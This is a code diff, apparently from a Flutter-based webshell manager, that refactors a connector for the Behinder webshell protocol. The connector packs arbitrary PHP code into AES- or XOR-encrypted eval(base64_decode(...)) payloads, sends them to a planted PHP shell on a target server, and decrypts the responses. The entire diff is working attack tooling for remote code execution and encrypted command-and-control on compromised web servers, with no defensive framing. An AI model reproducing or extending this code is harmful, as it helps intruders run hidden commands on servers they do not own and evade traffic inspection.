@@ -3,7 +3,6 @@ import 'dart:convert';
 import 'dart:typed_data';
 
 import 'package:encrypt/encrypt.dart' as enc;
-import 'package:flutter/foundation.dart';
 import 'package:http/http.dart' as http;
 
 import '../core/crypto/behinder_crypto.dart';
@@ -23,7 +22,7 @@ class PhpBehinderConnector extends ShellConnector {
   late final http.Client _client = http.Client();
   final Map<String, String> _cookies = {};
 
-  String get _aesKey => BehinderCrypto.deriveKey(webshell.password);
+  String get _key => BehinderCrypto.deriveKey(webshell.password);
 
   @override
   Set<ConnectorCapability> get capabilities => const {
@@ -47,7 +46,7 @@ class PhpBehinderConnector extends ShellConnector {
   String? get lastShellScriptDirDiagnostic => _lastShellScriptDirDiagnostic;
 
   String _aesEncryptBase64(String plain) {
-    final key = enc.Key(Uint8List.fromList(utf8.encode(_aesKey)));
+    final key = enc.Key(Uint8List.fromList(utf8.encode(_key)));
     if (_useCbc) {
       final iv = enc.IV(Uint8List(16));
       final encrypter = enc.Encrypter(enc.AES(key, mode: enc.AESMode.cbc));
@@ -94,10 +93,24 @@ class PhpBehinderConnector extends ShellConnector {
     }
   }
 
-  /// 把 PHP 代码包上 ob_start + JSON + AES/XOR 加密，对标标准 Behinder 响应格式。
+  /// 标准 Behinder 响应加密函数，对应 TransProtocol `php_aes` 的 Encrypt。
+  static const _encryptFunc = r'''
+function encrypt($data) {
+    $k = $_SESSION['k'];
+    if (extension_loaded('openssl')) {
+        return openssl_encrypt($data, "AES128", $k);
+    }
+    for ($i = 0; $i < strlen($data); $i++) {
+        $data[$i] = $data[$i] ^ $k[($i + 1) & 15];
+    }
+    return $data;
+}
+''';
+
+  /// 用标准格式包裹 PHP 业务代码：encrypt() + ob_start + JSON + encrypt 调用。
   String _wrapPhpWithEncrypt(String phpCode) {
-    final key = _aesKey;
     return '''
+$_encryptFunc
 @ob_start();
 $phpCode
 \$output = @ob_get_clean();
@@ -106,24 +119,12 @@ if (\$output === false) \$output = '';
     "status" => base64_encode("success"),
     "msg" => base64_encode(\$output)
 );
-\$json = json_encode(\$result);
-if (extension_loaded('openssl')) {
-    echo @openssl_encrypt(\$json, "AES128", "$key");
-} else {
-    \$k = "$key";
-    for (\$i = 0; \$i < strlen(\$json); \$i++) {
-        \$json[\$i] = \$json[\$i] ^ \$k[(\$i + 1) & 15];
-    }
-    echo \$json;
-}
+echo encrypt(json_encode(\$result));
 ''';
   }
 
   Future<String> _sendPhpUnlocked(String phpCode) async {
     try {
-      // 目标 bing.php 使用 explode('|') 来分离类名和参数。
-      // 如果 phpCode 中包含 '|'，代码会被截断导致 eval 失败。
-      // 因此必须用 base64 将代码包装一层，确保传输层没有 '|' 字符。
       final wrapped = _wrapPhpWithEncrypt(phpCode);
       final safeCode =
           "eval(base64_decode('${base64.encode(utf8.encode(wrapped))}'));";
@@ -143,9 +144,9 @@ if (extension_loaded('openssl')) {
         // 标准 Behinder PHP：base64(AES/CBC/zeroIV(json))
         // → XOR raw bytes（无 OpenSSL）
         // → Matrix 旧版：明文 或 base64(AES/ECB)
-        final decrypted = BehinderCrypto.tryDecryptPhp(body, _aesKey) ??
-            BehinderCrypto.tryDecryptPhpXor(response.bodyBytes, _aesKey) ??
-            BehinderCrypto.tryDecryptLegacyMatrix(body, _aesKey);
+        final decrypted = BehinderCrypto.tryDecryptPhp(body, _key) ??
+            BehinderCrypto.tryDecryptPhpXor(response.bodyBytes, _key) ??
+            BehinderCrypto.tryDecryptLegacyMatrix(body, _key);
         if (decrypted != null) return BehinderCrypto.extractResponse(decrypted);
         return body;
       }
